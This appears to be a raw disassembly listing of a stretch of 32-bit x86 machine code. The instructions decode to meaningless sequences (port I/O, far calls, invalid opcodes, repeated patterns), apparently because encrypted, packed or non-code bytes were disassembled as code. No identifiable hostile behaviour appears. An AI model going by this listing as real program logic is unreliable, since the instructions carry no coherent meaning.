  4044cd:	11 c2                	adc    %eax,%edx
  4044cf:	14 8d                	adc    $0x8d,%al
  4044d1:	02 fd                	add    %ch,%bh
  4044d3:	23 96 64 3a 8d 20    	and    0x208d3a64(%esi),%edx
  4044d9:	6b 8d 1b 96 6b 8c 5a 	imul   $0x5a,-0x739469e5(%ebp),%ecx
  4044e0:	53                   	push   %ebx
  4044e1:	ed                   	in     (%dx),%eax
  4044e2:	c2 df 72             	ret    $0x72df
  4044e5:	64 3a 66 f1          	cmp    %fs:-0xf(%esi),%ah
  4044e9:	93                   	xchg   %eax,%ebx
  4044ea:	c3                   	ret
  4044eb:	ef                   	out    %eax,(%dx)
  4044ec:	be e7 fc 07 3e       	mov    $0x3e07fce7,%esi
  4044f1:	ed                   	in     (%dx),%eax
  4044f2:	c2 df 72             	ret    $0x72df
  4044f5:	64 3a 66 d2          	cmp    %fs:-0x2e(%esi),%ah
  4044f9:	2b d6                	sub    %esi,%edx
  4044fb:	a2 26 93 d8 a7       	mov    %al,0xa7d89326
  404500:	82 67 b3 33          	andb   $0x33,-0x4d(%edi)
  404504:	98                   	cwtl
  404505:	ed                   	in     (%dx),%eax
  404506:	ed                   	in     (%dx),%eax
  404507:	e5 af                	in     $0xaf,%eax
  404509:	05 6d ed 15 90       	add    $0x9015ed6d,%eax
  40450e:	6d                   	insl   (%dx),%es:(%edi)
  40450f:	0e                   	push   %cs
  404510:	06                   	push   %es
  404511:	af                   	scas   %es:(%edi),%eax
  404512:	78 66                	js     0x40457a
  404514:	3f                   	aas
  404515:	8c b0 5f 68 64 b9    	mov    %?,-0x469b97a1(%eax)
  40451b:	a2 7c 02 c5 23       	mov    %al,0x23c5027c
  404520:	96                   	xchg   %eax,%esi
  404521:	6b 8d 23 96 5f 7f 9e 	imul   $0xffffff9e,0x7f5f9623(%ebp),%ecx
  404528:	1a cb                	sbb    %bl,%cl
  40452a:	b1 23                	mov    $0x23,%cl
  40452c:	9c                   	pushf
  40452d:	3b 64 3d a1          	cmp    -0x5f(%ebp,%edi,1),%esp
  404531:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404532:	6f                   	outsl  %ds:(%esi),(%dx)
  404533:	ef                   	out    %eax,(%dx)
  404534:	8d                   	lea    (bad),%ebx
  404535:	dc 7a 66             	fdivrl 0x66(%edx)
  404538:	6a 64                	push   $0x64
  40453a:	d2 c3                	rol    %cl,%bl
  40453c:	5c                   	pop    %esp
  40453d:	64 3a 35 3e 33 84 11 	cmp    %fs:0x1184333e,%dh
  404544:	03 96 21 e7 ae b9    	add    -0x465118df(%esi),%edx
  40454a:	7e 66                	jle    0x4045b2
  40454c:	68 e7 9f 92 97       	push   $0x97929fe7
  404551:	9a c5 66 eb c1 d6 99 	lcall  $0x99d6,$0xc1eb66c5
  404558:	95                   	xchg   %eax,%ebp
  404559:	9b                   	fwait
  40455a:	3a e7                	cmp    %bh,%ah
  40455c:	ae                   	scas   %es:(%edi),%al
  40455d:	c8 7b 66 68          	enter  $0x667b,$0x68
  404561:	e9 bf 9e 97 9a       	jmp    0x9ad7e425
  404566:	c5 36                	lds    (%esi),%esi
  404568:	97                   	xchg   %eax,%edi
  404569:	11 36                	adc    %esi,(%esi)
  40456b:	8e c1                	mov    %ecx,%es
  40456d:	94                   	xchg   %eax,%esp
  40456e:	c5 99 eb a0 32 ef    	lds    -0x10cd5f15(%ecx),%ebx
  404574:	ab                   	stos   %eax,%es:(%edi)
  404575:	6d                   	insl   (%dx),%es:(%edi)
  404576:	e1 13                	loope  0x40458b
  404578:	6f                   	outsl  %ds:(%esi),(%dx)
  404579:	55                   	push   %ebp
  40457a:	fa                   	cli
  40457b:	8f                   	(bad)
  40457c:	7e 6f                	jle    0x4045ed
  40457e:	3a 66 eb             	cmp    -0x15(%esi),%ah
  404581:	d9 c2                	fld    %st(2)
  404583:	99                   	cltd
  404584:	96                   	xchg   %eax,%esi
  404585:	9b                   	fwait
  404586:	3a 13                	cmp    (%ebx),%dl
  404588:	65 37                	gs aaa
  40458a:	d2 a7 5d 64 3a 57    	shlb   %cl,0x573a645d(%edi)
  404590:	a8 8d                	test   $0x8d,%al
  404592:	3a 6d 68             	cmp    0x68(%ebp),%ch
  404595:	64 c5 13             	lds    %fs:(%ebx),%edx
  404598:	7c 8c                	jl     0x404526
  40459a:	5c                   	pop    %esp
  40459b:	50                   	push   %eax
  40459c:	68 64 b3 e3 b0       	push   $0xb0e3b364
  4045a1:	9b                   	fwait
  4045a2:	c7                   	(bad)
  4045a3:	99                   	cltd
  4045a4:	d0 7d 3a             	sarb   $1,0x3a(%ebp)
  4045a7:	66 68 93 9f          	pushw  $0x9f93
  4045ab:	9e                   	sahf
  4045ac:	97                   	xchg   %eax,%edi
  4045ad:	9a c5 ef ed b0 c5 9b 	lcall  $0x9bc5,$0xb0edefc5
  4045b4:	97                   	xchg   %eax,%edi
  4045b5:	ef                   	out    %eax,(%dx)
  4045b6:	87 be 97 99 c5 0d    	xchg   %edi,0xdc59997(%esi)
  4045bc:	d5 bc                	aad    $0xbc
  4045be:	c5 9b 97 56 b1 f3    	lds    -0xc4ea969(%ebx),%ebx
  4045c4:	bc 9b c7 99 e5       	mov    $0xe599c79b,%esp
  4045c9:	d8 00                	fadds  (%eax)
  4045cb:	66 6c                	data16 insb (%dx),%es:(%edi)
  4045cd:	64 3a 31             	cmp    %fs:(%ecx),%dh
  4045d0:	02 24 d2             	add    (%edx,%edx,8),%ah
  4045d3:	0b 5d 64             	or     0x64(%ebp),%ebx
  4045d6:	3a ef                	cmp    %bh,%ch
  4045d8:	ed                   	in     (%dx),%eax
  4045d9:	98                   	cwtl
  4045da:	c5 98 97 ed ca 4f    	lds    0x4fcaed97(%eax),%ebx
  4045e0:	98                   	cwtl
  4045e1:	ed                   	in     (%dx),%eax
  4045e2:	fc                   	cld
  4045e3:	99                   	cltd
  4045e4:	1d 6c 52 62 69       	sbb    $0x6962526c,%eax
  4045e9:	64 3a 8e b8 50 3a 66 	cmp    %fs:0x663a50b8(%esi),%cl
  4045f0:	e1 94                	loope  0x404586
  4045f2:	13 96 e1 a2 b1 23    	adc    0x23b1a2e1(%esi),%edx
  4045f8:	60                   	pusha
  4045f9:	ed                   	in     (%dx),%eax
  4045fa:	bf b6 97 99 c5       	mov    $0xc59997b6,%edi
  4045ff:	ef                   	out    %eax,(%dx)
  404600:	a9 e7 f2 99 28       	test   $0x2899f2e7,%eax
  404605:	e4 06                	in     $0x6,%al
  404607:	67 68 11 c3 ef af    	addr16 push $0xafefc311
  40460d:	0e                   	push   %cs
  40460e:	32 ed                	xor    %ch,%ch
  404610:	fd                   	std
  404611:	b4 c5                	mov    $0xc5,%ah
  404613:	9b                   	fwait
  404614:	97                   	xchg   %eax,%edi
  404615:	65 c0 34 80 a9       	shlb   $0xa9,%gs:(%eax,%eax,4)
  40461a:	f5                   	cmc
  40461b:	99                   	cltd
  40461c:	97                   	xchg   %eax,%edi
  40461d:	e7 fe                	out    %eax,$0xfe
  40461f:	6e                   	outsb  %ds:(%esi),(%dx)
  404620:	00 0d f1 24 68 9b    	add    %cl,0x9b6824f1
  404626:	4f                   	dec    %edi
  404627:	6e                   	outsb  %ds:(%esi),(%dx)
  404628:	80 ff 02             	cmp    $0x2,%bh
  40462b:	66 68 e7 fe          	pushw  $0xfee7
  40462f:	6e                   	outsb  %ds:(%esi),(%dx)
  404630:	00 06                	add    %al,(%esi)
  404632:	f1                   	int1
  404633:	24 68                	and    $0x68,%al
  404635:	9b                   	fwait
  404636:	8f                   	(bad)
  404637:	9a 97 9a c5 8e 0c 5c 	lcall  $0x5c0c,$0x8ec59a97
  40463e:	3a 66 eb             	cmp    -0x15(%esi),%ah
  404641:	a0 32 8e 2c 5c       	mov    0x5c2c8e32,%al
  404646:	3a 66 d1             	cmp    -0x2f(%esi),%ah
  404649:	6e                   	outsb  %ds:(%esi),(%dx)
  40464a:	3a 66 68             	cmp    0x68(%esi),%ah
  40464d:	fd                   	std
  40464e:	cd 9f                	int    $0x9f
  404650:	eb 9e                	jmp    0x4045f0
  404652:	3f                   	aas
  404653:	1b 7b 0c             	sbb    0xc(%ebx),%edi
  404656:	56                   	push   %esi
  404657:	aa                   	stos   %al,%es:(%edi)
  404658:	2a 64 c5 d3          	sub    -0x2d(%ebp,%eax,8),%ah
  40465c:	94                   	xchg   %eax,%esp
  40465d:	9b                   	fwait
  40465e:	c4 99 80 07 02 66    	les    0x66020780(%ecx),%ebx
  404664:	68 e7 fe 6e 80       	push   $0x806efee7
  404669:	7b 02                	jnp    0x40466d
  40466b:	66 68 dd 30          	pushw  $0x30dd
  40466f:	66 68 64 a3          	pushw  $0xa364
  404673:	91                   	xchg   %eax,%ecx
  404674:	91                   	xchg   %eax,%ecx
  404675:	e7 c0                	out    %eax,$0xc0
  404677:	63 15 47 d2 6b 50    	arpl   %edx,0x506bd247
  40467d:	64 3a df             	fs cmp %bh,%bl
  404680:	0b 64 3a 66          	or     0x66(%edx,%edi,1),%esp
  404684:	f1                   	int1
  404685:	93                   	xchg   %eax,%ebx
  404686:	c3                   	ret
  404687:	34 e3                	xor    $0xe3,%al
  404689:	d9 c6                	fld    %st(6)
  40468b:	99                   	cltd
  40468c:	96                   	xchg   %eax,%esi
  40468d:	9b                   	fwait
  40468e:	6d                   	insl   (%dx),%es:(%edi)
  40468f:	0e                   	push   %cs
  404690:	3a af 78 66 3f 8c    	cmp    -0x73c09988(%edi),%ch
  404696:	30 5e 68             	xor    %bl,0x68(%esi)
  404699:	64 b9 a2 78 ed ca    	fs mov $0xcaed78a2,%ecx
  40469f:	91                   	xchg   %eax,%ecx
  4046a0:	8e ed                	mov    %ebp,%gs
  4046a2:	bf aa 97 99 c5       	mov    $0xc59997aa,%edi
  4046a7:	ef                   	out    %eax,(%dx)
  4046a8:	ae                   	scas   %es:(%edi),%al
  4046a9:	8c e4                	mov    %fs,%esp
  4046ab:	51                   	push   %ecx
  4046ac:	68 64 83 6c 68       	push   $0x686c8364
  4046b1:	64 3a ff             	fs cmp %bh,%bh
  4046b4:	9f                   	lahf
  4046b5:	9d                   	popf
  4046b6:	b9 9c 6d 19 29       	mov    $0x29196d9c,%ecx
  4046bb:	0e                   	push   %cs
  4046bc:	04 a8                	add    $0xa8,%al
  4046be:	78 66                	js     0x404726
  4046c0:	97                   	xchg   %eax,%edi
  4046c1:	d1 c6                	rol    $1,%esi
  4046c3:	99                   	cltd
  4046c4:	96                   	xchg   %eax,%esi
  4046c5:	9b                   	fwait
  4046c6:	d2 9b 5f 64 3a e5    	rcrb   %cl,-0x1ac59ba1(%ebx)
  4046cc:	ac                   	lods   %ds:(%esi),%al
  4046cd:	6c                   	insb   (%dx),%es:(%edi)
  4046ce:	52                   	push   %edx
  4046cf:	2d a3 26 3a 99       	sub    $0x993a26a3,%eax
  4046d4:	dd 98 c5 98 97 8c    	fstpl  -0x7368673b(%eax)
  4046da:	d0 51 68             	rclb   $1,0x68(%ecx)
  4046dd:	64 b9 a2 60 8c 9c    	fs mov $0x9c8c60a2,%ecx
  4046e3:	51                   	push   %ecx
  4046e4:	68 64 83 6c 68       	push   $0x686c8364
  4046e9:	64 3a ff             	fs cmp %bh,%bh
  4046ec:	9f                   	lahf
  4046ed:	9d                   	popf
  4046ee:	b9 9c 6d 19 29       	mov    $0x29196d9c,%ecx
  4046f3:	0e                   	push   %cs
  4046f4:	04 a8                	add    $0xa8,%al
  4046f6:	78 66                	js     0x40475e
  4046f8:	97                   	xchg   %eax,%edi
  4046f9:	d1 c6                	rol    $1,%esi
  4046fb:	99                   	cltd
  4046fc:	96                   	xchg   %eax,%esi
  4046fd:	9b                   	fwait
  4046fe:	d2 a3 5f 64 3a e5    	shlb   %cl,-0x1ac59ba1(%ebx)
  404704:	ac                   	lods   %ds:(%esi),%al
  404705:	6c                   	insb   (%dx),%es:(%edi)
  404706:	bb 90 e3 3d 3a       	mov    $0x3a3de390,%ebx
  40470b:	66 80 1f 0d          	data16 sbbb $0xd,(%edi)
  40470f:	66 68 dd 30          	pushw  $0x30dd
  404713:	66 68 64 a3          	pushw  $0xa364
  404717:	91                   	xchg   %eax,%ecx
  404718:	91                   	xchg   %eax,%ecx
  404719:	e7 c0                	out    %eax,$0xc0
  40471b:	63 15 47 d2 0f 5f    	arpl   %edx,0x5f0fd247
  404721:	64 3a df             	fs cmp %bh,%bl
  404724:	0b 64 3a 66          	or     0x66(%edx,%edi,1),%esp
  404728:	f1                   	int1
  404729:	93                   	xchg   %eax,%ebx
  40472a:	c3                   	ret
  40472b:	34 e3                	xor    $0xe3,%al
  40472d:	d9 c6                	fld    %st(6)
  40472f:	99                   	cltd
  404730:	96                   	xchg   %eax,%esi
  404731:	9b                   	fwait
  404732:	6d                   	insl   (%dx),%es:(%edi)
  404733:	0e                   	push   %cs
  404734:	3a af 78 66 3f 8c    	cmp    -0x73c09988(%edi),%ch
  40473a:	5c                   	pop    %esp
  40473b:	51                   	push   %ecx
  40473c:	68 64 b9 a2 78       	push   $0x78a2b964
  404741:	9b                   	fwait
  404742:	4f                   	dec    %edi
  404743:	42                   	inc    %edx
  404744:	00 42 f1             	add    %al,-0xf(%edx)
  404747:	24 68                	and    $0x68,%al
  404749:	ef                   	out    %eax,(%dx)
  40474a:	bf 9a 97 9a c5       	mov    $0xc59a979a,%edi
  40474f:	36 00 51 f1          	add    %dl,%ss:-0xf(%ecx)
  404753:	24 68                	and    $0x68,%al
  404755:	34 d2                	xor    $0xd2,%al
  404757:	2f                   	das
  404758:	5f                   	pop    %edi
  404759:	64 3a e5             	fs cmp %ch,%ah
  40475c:	ac                   	lods   %ds:(%esi),%al
  40475d:	70 d2                	jo     0x404731
  40475f:	4f                   	dec    %edi
  404760:	5f                   	pop    %edi
  404761:	64 3a df             	fs cmp %bh,%bl
  404764:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  404768:	f1                   	int1
  404769:	93                   	xchg   %eax,%ebx
  40476a:	c3                   	ret
  40476b:	e5 92                	in     $0x92,%eax
  40476d:	61                   	popa
  40476e:	47                   	inc    %edi
  40476f:	75 00                	jne    0x404771
  404771:	08 f6                	or     %dh,%dh
  404773:	24 68                	and    $0x68,%al
  404775:	9b                   	fwait
  404776:	8f                   	(bad)
  404777:	9a 97 9a c5 8e 20 53 	lcall  $0x5320,$0x8ec59a97
  40477e:	3a 66 eb             	cmp    -0x15(%esi),%ah
  404781:	a0 32 0e 76 af       	mov    0xaf760e32,%al
  404786:	78 66                	js     0x4047ee
  404788:	97                   	xchg   %eax,%edi
  404789:	d1 c6                	rol    $1,%esi
  40478b:	99                   	cltd
  40478c:	96                   	xchg   %eax,%esi
  40478d:	9b                   	fwait
  40478e:	d2 53 5f             	rclb   %cl,0x5f(%ebx)
  404791:	64 3a e5             	fs cmp %ch,%ah
  404794:	ac                   	lods   %ds:(%esi),%al
  404795:	6c                   	insb   (%dx),%es:(%edi)
  404796:	d2 97 5e 64 3a df    	rclb   %cl,-0x20c59ba2(%edi)
  40479c:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  4047a0:	f1                   	int1
  4047a1:	93                   	xchg   %eax,%ebx
  4047a2:	c3                   	ret
  4047a3:	e5 92                	in     $0x92,%eax
  4047a5:	61                   	popa
  4047a6:	47                   	inc    %edi
  4047a7:	75 00                	jne    0x4047a9
  4047a9:	08 f6                	or     %dh,%dh
  4047ab:	24 68                	and    $0x68,%al
  4047ad:	9b                   	fwait
  4047ae:	8f                   	(bad)
  4047af:	9a 97 9a c5 8e 78 53 	lcall  $0x5378,$0x8ec59a97
  4047b6:	3a 66 eb             	cmp    -0x15(%esi),%ah
  4047b9:	a0 32 e7 ae 0b       	mov    0xbaee732,%al
  4047be:	6a 66                	push   $0x66
  4047c0:	68 0c 2d ad 2a       	push   $0x2aad2d0c
  4047c5:	64 c5 d3 94          	(bad)
  4047c9:	9b                   	fwait
  4047ca:	c4 99 80 93 0c 66    	les    0x660c9380(%ecx),%ebx
  4047d0:	68 e7 fe 6e 80       	push   $0x806efee7
  4047d5:	d7                   	xlat   %ds:(%ebx)
  4047d6:	0c 66                	or     $0x66,%al
  4047d8:	68 dd 30 66 68       	push   $0x686630dd
  4047dd:	64 a3 91 91 e7 c0    	mov    %eax,%fs:0xc0e79191
  4047e3:	63 15 47 d2 c7 5e    	arpl   %edx,0x5ec7d247
  4047e9:	64 3a df             	fs cmp %bh,%bl
  4047ec:	0b 64 3a 66          	or     0x66(%edx,%edi,1),%esp
  4047f0:	f1                   	int1
  4047f1:	93                   	xchg   %eax,%ebx
  4047f2:	c3                   	ret
  4047f3:	34 e3                	xor    $0xe3,%al
  4047f5:	d9 c6                	fld    %st(6)
  4047f7:	99                   	cltd
  4047f8:	96                   	xchg   %eax,%esi
  4047f9:	9b                   	fwait
  4047fa:	6d                   	insl   (%dx),%es:(%edi)
  4047fb:	0e                   	push   %cs
  4047fc:	3a af 78 66 3f 8c    	cmp    -0x73c09988(%edi),%ch
  404802:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404803:	50                   	push   %eax
  404804:	68 64 b9 a2 78       	push   $0x78a2b964
  404809:	8c 44 50 68          	mov    %es,0x68(%eax,%edx,2)
  40480d:	64 83 8e 6b 64 3a ff 	orl    $0xffffff9f,%fs:-0xc59b95(%esi)
  404814:	9f 
  404815:	9d                   	popf
  404816:	68 0e 79 af 78       	push   $0x78af790e
  40481b:	66 e5 d9             	in     $0xd9,%ax
  40481e:	e4 99                	in     $0x99,%al
  404820:	95                   	xchg   %eax,%ebp
  404821:	9b                   	fwait
  404822:	6d                   	insl   (%dx),%es:(%edi)
  404823:	8e 14 52             	mov    (%edx,%edx,2),%ss
  404826:	3a 66 e5             	cmp    -0x1b(%esi),%ah
  404829:	e1 e4                	loope  0x40480f
  40482b:	99                   	cltd
  40482c:	95                   	xchg   %eax,%ebp
  40482d:	9b                   	fwait
  40482e:	6a 99                	push   $0xffffff99
  404830:	1d 74 b1 e3 94       	sbb    $0x94e3b174,%eax
  404835:	9b                   	fwait
  404836:	c4 99 38 0c de ac    	les    -0x5321f3c8(%ecx),%ebx
  40483c:	2a 64 6a 8e          	sub    -0x72(%edx,%ebp,2),%ah
  404840:	08 52 3a             	or     %dl,0x3a(%edx)
  404843:	66 eb a0             	data16 jmp 0x4047e6
  404846:	1a 8e 28 52 3a 66    	sbb    0x663a5228(%esi),%cl
  40484c:	d1 6e 3a             	shrl   $1,0x3a(%esi)
  40484f:	66 68 fd cd          	pushw  $0xcdfd
  404853:	9f                   	lahf
  404854:	eb 9e                	jmp    0x4047f4
  404856:	3f                   	aas
  404857:	1b 4b 8c             	sbb    -0x74(%ebx),%ecx
  40485a:	14 50                	adc    $0x50,%al
  40485c:	68 64 83 05 68       	push   $0x68058364
  404861:	64 3a ff             	fs cmp %bh,%bh
  404864:	9f                   	lahf
  404865:	9d                   	popf
  404866:	68 ed d5 98 c5       	push   $0xc598d5ed
  40486b:	98                   	cwtl
  40486c:	97                   	xchg   %eax,%edi
  40486d:	33 52 34             	xor    0x34(%edx),%edx
  404870:	a3 26 3a 31 80       	mov    %eax,0x80313a26
  404875:	4f                   	dec    %edi
  404876:	0c 66                	or     $0x66,%al
  404878:	68 e7 fe 76 e9       	push   $0xe976fee7
  40487d:	a2 a8 4b 68 64       	mov    %al,0x64684ba8
  404882:	d2 63 5e             	shlb   %cl,0x5e(%ebx)
  404885:	64 3a df             	fs cmp %bh,%bl
  404888:	62 64 3a 66          	bound  %esp,0x66(%edx,%edi,1)
  40488c:	f1                   	int1
  40488d:	93                   	xchg   %eax,%ebx
  40488e:	c3                   	ret
  40488f:	e5 92                	in     $0x92,%eax
  404891:	61                   	popa
  404892:	47                   	inc    %edi
  404893:	75 00                	jne    0x404895
  404895:	08 f6                	or     %dh,%dh
  404897:	24 68                	and    $0x68,%al
  404899:	9b                   	fwait
  40489a:	8f                   	(bad)
  40489b:	9a 97 9a c5 8e 4c 52 	lcall  $0x524c,$0x8ec59a97
  4048a2:	3a 66 eb             	cmp    -0x15(%esi),%ah
  4048a5:	a0 32 8e 88 51       	mov    0x51888e32,%al
  4048aa:	3a 66 d1             	cmp    -0x2f(%esi),%ah
  4048ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4048ae:	3a 66 68             	cmp    0x68(%esi),%ah
  4048b1:	fd                   	std
  4048b2:	cd 9f                	int    $0x9f
  4048b4:	eb 9e                	jmp    0x404854
  4048b6:	3f                   	aas
  4048b7:	1b 7b 0c             	sbb    0xc(%ebx),%edi
  4048ba:	e5 ac                	in     $0xac,%eax
  4048bc:	2a 64 c5 d3          	sub    -0x2d(%ebp,%eax,8),%ah
  4048c0:	94                   	xchg   %eax,%esp
  4048c1:	9b                   	fwait
  4048c2:	c4 99 80 9b 0f 66    	les    0x660f9b80(%ecx),%ebx
  4048c8:	68 e7 fe 6e 80       	push   $0x806efee7
  4048cd:	df 0f                	fisttps (%edi)
  4048cf:	66 68 dd 30          	pushw  $0x30dd
  4048d3:	66 68 64 a3          	pushw  $0xa364
  4048d7:	91                   	xchg   %eax,%ecx
  4048d8:	91                   	xchg   %eax,%ecx
  4048d9:	e7 c0                	out    %eax,$0xc0
  4048db:	63 15 77 52 0a a4    	arpl   %edx,0xa40a5277
  4048e1:	26 3a 99 dd 98 c5 98 	cmp    %es:-0x673a6723(%ecx),%bl
  4048e8:	97                   	xchg   %eax,%edi
  4048e9:	8c e0                	mov    %fs,%eax
  4048eb:	53                   	push   %ebx
  4048ec:	68 64 b9 a2 60       	push   $0x60a2b964
  4048f1:	e5 d4                	in     $0xd4,%eax
  4048f3:	c9                   	leave
  4048f4:	29 64 3a 0e          	sub    %esp,0xe(%edx,%edi,1)
  4048f8:	c3                   	ret
  4048f9:	ae                   	scas   %es:(%edi),%al
  4048fa:	78 66                	js     0x404962
  4048fc:	97                   	xchg   %eax,%edi
  4048fd:	11 2e                	adc    %ebp,(%esi)
  4048ff:	ed                   	in     (%dx),%eax
  404900:	ed                   	in     (%dx),%eax
  404901:	98                   	cwtl
  404902:	c5 98 97 34 52 c8    	lds    -0x37adcb69(%eax),%ebx
  404908:	a2 26 3a 36 80       	mov    %al,0x80363a26
  40490d:	f7 0f 66 68 e7 fe    	testl  $0xfee76866,(%edi)
  404913:	72 80                	jb     0x404895
  404915:	17                   	pop    %ss
  404916:	0f 66 68 dd          	pcmpgtd -0x23(%eax),%mm5
  40491a:	30 66 68             	xor    %ah,0x68(%esi)
  40491d:	64 a3 91 91 e7 c0    	mov    %eax,%fs:0xc0e79191
  404923:	63 15 77 52 b9 a2    	arpl   %edx,0xa2b95277
  404929:	26 3a 99 dd 98 c5 98 	cmp    %es:-0x673a6723(%ecx),%bl
  404930:	97                   	xchg   %eax,%edi
  404931:	8c a8 53 68 64 b9    	mov    %gs,-0x469b97ad(%eax)
  404937:	a2 60 8c 74 53       	mov    %al,0x53748c60
  40493c:	68 64 83 6c 68       	push   $0x686c8364
  404941:	64 3a ff             	fs cmp %bh,%bh
  404944:	9f                   	lahf
  404945:	9d                   	popf
  404946:	b9 9c 6d 19 29       	mov    $0x29196d9c,%ecx
  40494b:	0e                   	push   %cs
  40494c:	04 a8                	add    $0xa8,%al
  40494e:	78 66                	js     0x4049b6
  404950:	97                   	xchg   %eax,%edi
  404951:	d1 c6                	rol    $1,%esi
  404953:	99                   	cltd
  404954:	96                   	xchg   %eax,%esi
  404955:	9b                   	fwait
  404956:	d2 0b                	rorb   %cl,(%ebx)
  404958:	5d                   	pop    %ebp
  404959:	64 3a e5             	fs cmp %ch,%ah
  40495c:	ac                   	lods   %ds:(%esi),%al
  40495d:	6c                   	insb   (%dx),%es:(%edi)
  40495e:	b3 96                	mov    $0x96,%bl
  404960:	41                   	inc    %ecx
  404961:	94                   	xchg   %eax,%esp
  404962:	b3 a0                	mov    $0xa0,%bl
  404964:	80 47 0f 66          	addb   $0x66,0xf(%edi)
  404968:	68 dd 30 66 68       	push   $0x686630dd
  40496d:	64 a3 91 91 e7 c0    	mov    %eax,%fs:0xc0e79191
  404973:	63 15 47 d2 77 5d    	arpl   %edx,0x5d77d247
  404979:	64 3a df             	fs cmp %bh,%bl
  40497c:	0b 64 3a 66          	or     0x66(%edx,%edi,1),%esp
  404980:	f1                   	int1
  404981:	93                   	xchg   %eax,%ebx
  404982:	c3                   	ret
  404983:	34 e3                	xor    $0xe3,%al
  404985:	d9 c6                	fld    %st(6)
  404987:	99                   	cltd
  404988:	96                   	xchg   %eax,%esi
  404989:	9b                   	fwait
  40498a:	6d                   	insl   (%dx),%es:(%edi)
  40498b:	0e                   	push   %cs
  40498c:	3a af 78 66 3f 8c    	cmp    -0x73c09988(%edi),%ch
  404992:	34 53                	xor    $0x53,%al
  404994:	68 64 b9 a2 78       	push   $0x78a2b964
  404999:	e7 47                	out    %eax,$0x47
  40499b:	46                   	inc    %esi
  40499c:	68 6b be 09 69       	push   $0x6909be6b
  4049a1:	64 3a e5             	fs cmp %ch,%ah
  4049a4:	cd ac                	int    $0xac
  4049a6:	c5 9b 97 64 d3 20    	lds    0x20d36497(%ebx),%ebx
  4049ac:	69 64 3a a0 ed 64 3a 	imul   $0x993a64ed,-0x60(%edx,%edi,1),%esp
  4049b3:	99 
  4049b4:	97                   	xchg   %eax,%edi
  4049b5:	64 bb 88 3b 09 3a    	fs mov $0x3a093b88,%ebx
  4049bb:	66 eb c1             	data16 jmp 0x40497f
  4049be:	fe                   	(bad)
  4049bf:	99                   	cltd
  4049c0:	95                   	xchg   %eax,%ebp
  4049c1:	9b                   	fwait
  4049c2:	3a 8d 1e ef bf ae    	cmp    -0x514010e2(%ebp),%cl
  4049c8:	97                   	xchg   %eax,%edi
  4049c9:	99                   	cltd
  4049ca:	c5 65 ed             	lds    -0x13(%ebp),%esp
  4049cd:	a0 c5 9b 97 5f       	mov    0x5f979bc5,%al
  4049d2:	bf 9e 97 9a c5       	mov    $0xc59a979e,%edi
  4049d7:	15 1a ef 87 ae       	adc    $0xae87ef1a,%eax
  4049dc:	97                   	xchg   %eax,%edi
  4049dd:	99                   	cltd
  4049de:	c5 65 d5             	lds    -0x2b(%ebp),%esp
  4049e1:	a0 c5 9b 97 6b       	mov    0x6b979bc5,%al
  4049e6:	8c 5a 53             	mov    %ds,0x53(%edx)
  4049e9:	ed                   	in     (%dx),%eax
  4049ea:	c2 df 72             	ret    $0x72df
  4049ed:	64 3a 66 f1          	cmp    %fs:-0xf(%esi),%ah
  4049f1:	93                   	xchg   %eax,%ebx
  4049f2:	c3                   	ret
  4049f3:	e5 aa                	in     $0xaa,%eax
  4049f5:	05 68 ef 90 dd       	add    $0xdd90ef68,%eax
  4049fa:	20 66 68             	and    %ah,0x68(%esi)
  4049fd:	64 80 29 84          	subb   $0x84,%fs:(%ecx)
  404a01:	a0 74 91 8a a5       	mov    0xa58a9174,%al
  404a06:	d0 65 e1             	shlb   $1,-0x1f(%ebp)
  404a09:	f1                   	int1
  404a0a:	fa                   	cli
  404a0b:	99                   	cltd
  404a0c:	95                   	xchg   %eax,%ebp
  404a0d:	9b                   	fwait
  404a0e:	b3 b1                	mov    $0xb1,%bl
  404a10:	eb a3                	jmp    0x4049b5
  404a12:	5b                   	pop    %ebx
  404a13:	31 e5                	xor    %esp,%ebp
  404a15:	d9 3a                	fnstcw (%edx)
  404a17:	66 97                	xchg   %ax,%di
  404a19:	9b                   	fwait
  404a1a:	6d                   	insl   (%dx),%es:(%edi)
  404a1b:	0e                   	push   %cs
  404a1c:	06                   	push   %es
  404a1d:	af                   	scas   %es:(%edi),%eax
  404a1e:	78 66                	js     0x404a86
  404a20:	e5 d9                	in     $0xd9,%eax
  404a22:	3a 66 97             	cmp    -0x69(%esi),%ah
  404a25:	9b                   	fwait
  404a26:	6d                   	insl   (%dx),%es:(%edi)
  404a27:	8e 10                	mov    (%eax),%ss
  404a29:	50                   	push   %eax
  404a2a:	3a 66 eb             	cmp    -0x15(%esi),%ah
  404a2d:	a0 2e ef 98 65       	mov    0x6598ef2e,%al
  404a32:	ca ef ae             	lret   $0xaeef
  404a35:	9b                   	fwait
  404a36:	bf a2 97 99 c5       	mov    $0xc59997a2,%edi
  404a3b:	e7 d5                	out    %eax,$0xd5
  404a3d:	a0 c5 9b 97 e4       	mov    0xe4979bc5,%al
  404a42:	3a 66 68             	cmp    0x68(%esi),%ah
  404a45:	6b b8 1c 97 9b c5 99 	imul   $0xffffff99,-0x3a6468e4(%eax),%edi
  404a4c:	dd 90 c5 98 97 9b    	fstl   -0x6468673b(%eax)
  404a52:	4f                   	dec    %edi
  404a53:	7e e5                	jle    0x404a3a
  404a55:	e1 3a                	loope  0x404a91
  404a57:	66 97                	xchg   %ax,%di
  404a59:	9b                   	fwait
  404a5a:	6a ed                	push   $0xffffffed
  404a5c:	ed                   	in     (%dx),%eax
  404a5d:	98                   	cwtl
  404a5e:	c5 98 97 34 52 1e    	lds    0x1e523497(%eax),%ebx
  404a64:	a2 26 3a 36 80       	mov    %al,0x80363a26
  404a69:	53                   	push   %ebx
  404a6a:	0e                   	push   %cs
  404a6b:	66 68 e7 fe          	pushw  $0xfee7
  404a6f:	7e 80                	jle    0x4049f1
  404a71:	73 0e                	jae    0x404a81
  404a73:	66 68 dd 30          	pushw  $0x30dd
  404a77:	66 68 64 a3          	pushw  $0xa364
  404a7b:	91                   	xchg   %eax,%ecx
  404a7c:	91                   	xchg   %eax,%ecx
  404a7d:	e7 c0                	out    %eax,$0xc0
  404a7f:	63 15 77 52 17 a2    	arpl   %edx,0xa2175277
  404a85:	26 3a 99 dd 98 c5 98 	cmp    %es:-0x673a6723(%ecx),%bl
  404a8c:	97                   	xchg   %eax,%edi
  404a8d:	8c 0c 52             	mov    %cs,(%edx,%edx,2)
